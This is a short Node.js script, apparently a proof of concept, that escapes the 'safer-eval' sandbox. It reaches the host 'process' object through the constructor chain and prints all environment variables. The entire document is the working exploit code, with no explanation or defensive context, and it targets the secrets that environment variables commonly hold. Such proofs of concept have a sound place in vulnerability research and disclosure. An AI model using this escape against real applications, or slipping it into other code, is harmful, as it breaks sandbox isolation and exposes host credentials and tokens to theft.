const saferEval = require('safer-eval')

console.log(saferEval("console.constructor.constructor('return process')().env"));
